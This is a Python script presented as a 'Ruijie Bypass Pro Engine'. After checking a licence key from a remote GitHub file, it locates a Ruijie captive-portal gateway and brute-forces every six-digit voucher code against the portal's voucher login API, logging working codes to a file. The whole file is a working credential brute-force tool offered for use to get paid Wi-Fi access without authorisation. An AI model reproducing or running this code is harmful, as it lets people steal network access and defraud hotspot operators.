import os
import re
import sys
import zlib
import json
import time
import ping3
import ntplib
import base64
import random
import string
import urllib
import marshal
import aiohttp
import asyncio
import hashlib
import argparse
import requests
import subprocess
from datetime import datetime, timedelta
from urllib.parse import quote
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.Random import get_random_bytes
from concurrent.futures import ThreadPoolExecutor

# --- Global Configurations ---
SUCCESS = 0
IN_RUNNING_ASCII_BIN = []
MY = ""
w, g, y, r, b = "\033[1;00m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m"

# --- Utility Functions ---
def clear():
    os.system("clear")

def Line():
    print(f"{y}-" * os.get_terminal_size()[0] + f"{w}")

def Logo():
    clear()
    logo = f"""{r},-_/         .     ,--. .        .
'  | . . ,-. |-   | `-' |  . ,-. | ,
   | | | `-. |    |   . |  | |   |<
   | `-^ `-' `'   `--'  `' ' `-' ' `
/` |
`--'  {g}              Created by MOE YU\033[1;00m"""
    print(logo)
    Line()
    print(f"{w}[*] Developer: Moe Yu")
    print(f"{w}[*] Tool: Ruijie Bypass Pro Engine v22.0")
    Line()

# --- Expiration & Key System Logic ---
def get_current_time():
    try:
        client = ntplib.NTPClient()
        response = client.request('pool.ntp.org', version=3)
        return time.ctime(response.tx_time)
    except:
        return time.ctime() # Network မရလျှင် Local time သုံးမည်

def check_key_expiration(expiration_time, current_time):
    # Format: mm-hh-dd-MM-yyyy
    try:
        exp_dt = datetime.strptime(expiration_time, "%M-%H-%d-%m-%Y")
        cur_dt = datetime.strptime(current_time, "%a %b %d %H:%M:%S %Y")
        
        if exp_dt > cur_dt:
            return (True, exp_dt > cur_dt + timedelta(minutes=30))
        return (False, False)
    except:
        return (False, False)

def get_uid():
    uid = str(os.getlogin()) + str(os.getuid())
    return hashlib.md5(uid.encode()).hexdigest()[:15].upper()

async def security_check():
    uid = get_uid()
    current_time = get_current_time()
    # GitHub မှ key database ကို လှမ်းစစ်ခြင်း
    key_url = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
    
    try:
        response = requests.get(key_url).text
        for line in response.splitlines():
            if "~" in line:
                db_uid, exp_date = line.split("~")
                if db_uid == uid:
                    is_valid, is_long = check_key_expiration(exp_date, current_time)
                    if is_valid:
                        return True
                    else:
                        print(f"{r}[!] Key Expired!")
                        sys.exit()
        
        print(f"{r}[!] Key Not Found!")
        print(f"{g}Your UID: {uid}")
        sys.exit()
    except:
        print(f"{r}[!] Connection Error!")
        sys.exit()

# --- Core Functional Classes ---
class Setup:
    def set(self):
        Logo()
        print(f"{g}[+] Scanning Ruijie Gateway...")
        try:
            res = requests.get("http://192.168.0.1", timeout=10)
            gw_ip = re.search(r'gw_address=(.*?)&', res.url).group(1)
            session_url = "https://portal-as.ruijienetworks.com" + re.search(r"href='(.*?)'", res.text).group(1)
            
            with open(".ip", "w") as f: f.write(gw_ip)
            with open(".session_url", "w") as f: f.write(session_url)
            print(f"{g}[+] Setup Success! IP: {gw_ip}")
        except:
            print(f"{r}[!] Setup Failed. Connect to Wi-Fi first.")

class VoucherAttack:
    def __init__(self, mode="digit", length=6):
        self.mode = mode
        self.length = length
        self.session_url = open(".session_url").read().strip() if os.path.exists(".session_url") else None

    async def start(self):
        if not self.session_url: return
        Logo()
        print(f"{g}[*] Attacking with mode: {self.mode} ({self.length} digits)")
        
        async with aiohttp.ClientSession() as session:
            # Get Session ID
            async with session.get(self.session_url) as r:
                sid = re.search(r"sessionId=([a-zA-Z0-9]+)", str(r.url)).group(1)
            
            # Simple digit brute loop
            for i in range(10**self.length):
                voucher = str(i).zfill(self.length)
                await self.login(session, sid, voucher)

    async def login(self, session, sid, voucher):
        url = "https://portal-as.ruijienetworks.com/api/auth/voucher/"
        data = {"accessCode": voucher, "sessionId": sid, "apiVersion": 1}
        try:
            async with session.post(url, json=data) as resp:
                if 'logonUrl' in await resp.text():
                    print(f"{g}[SUCCESS] {voucher}")
                    with open("success.txt", "a") as f: f.write(voucher + "\n")
        except: pass

# --- Main Entry ---
async def main():
    await security_check() # Key စစ်မည်
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["setup", "attack"], required=True)
    args = parser.parse_args()

    if args.option == "setup":
        Setup().set()
    elif args.option == "attack":
        attack = VoucherAttack()
        await attack.start()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{y}[!] Stopped.")
